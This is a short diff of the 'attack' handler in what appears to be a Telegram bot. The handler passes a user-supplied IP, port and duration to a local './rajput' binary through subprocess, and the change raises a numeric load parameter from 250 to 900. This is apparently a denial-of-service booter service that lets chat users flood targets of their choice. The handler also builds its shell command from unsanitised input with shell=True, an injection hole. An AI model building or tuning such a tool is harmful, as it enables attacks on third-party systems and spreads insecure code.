@@ -144,7 +144,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     # Execute attack command
     try:
         process = subprocess.Popen(
-            f"./rajput {ip} {port} {duration} 250",  # Replace with actual attack tool command
+            f"./rajput {ip} {port} {duration} 900",  # Replace with actual attack tool command
             shell=True,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE
